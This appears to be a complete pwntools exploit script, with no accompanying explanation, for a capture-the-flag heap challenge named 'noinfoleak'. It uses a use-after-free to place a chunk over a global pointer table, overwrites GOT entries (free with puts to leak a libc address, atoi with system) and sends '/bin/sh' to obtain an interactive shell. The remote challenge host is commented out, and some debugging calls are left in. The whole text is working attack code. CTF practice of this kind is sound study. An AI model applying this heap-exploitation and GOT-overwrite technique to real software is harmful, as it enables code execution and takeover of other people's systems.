from pwn import *

context.terminal = ['notiterm', '-t', 'iterm', '-e']

elf = ELF("./noinfoleak")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(size,content):
    p.sendlineafter(">","1")
    p.sendlineafter(">",str(size))
    p.sendafter(">",content)
def delete(id):
    p.sendlineafter(">","2")
    p.sendlineafter(">",str(id))
def edit(id,content):
    p.sendlineafter(">","3")
    p.sendlineafter(">",str(id))
    p.sendafter(">",content)
p = process("./noinfoleak")
# p = remote("ctf1.linkedbyx.com",10276)
add(0x61,"a"*0x50) #0
add(127,"a"*0x50)  #1
add(0x71,"a"*0x50) #2
add(0x71,"a"*0x50) #3
delete(0)
# delete(1)
edit(0,p64(0x6010c0)) #0
gdb.attach(p,'break *0x400AD5')
add(0x61,"aaaa")      #1  
pause()
add(0x61,p64(elf.got['atoi']) + p64(8) + p64(elf.got['free']) + p64(8)) # 0x6010c0
# edit(4,p64(0x400A93))
delete(1)
edit(4,p64(elf.plt['puts']))
ss = raw_input()
delete(1)
unsort = u64(p.recvuntil("\n")[:-1].ljust(8,"\x00"))
print hex(unsort)
libc.address = unsort - 0x3c4b78
edit(3,p64(libc.symbols['system']))

p.sendlineafter(">","/bin/sh")
# p.sendline("cat flag")
# print p.recvuntil("flag")
p.interactive()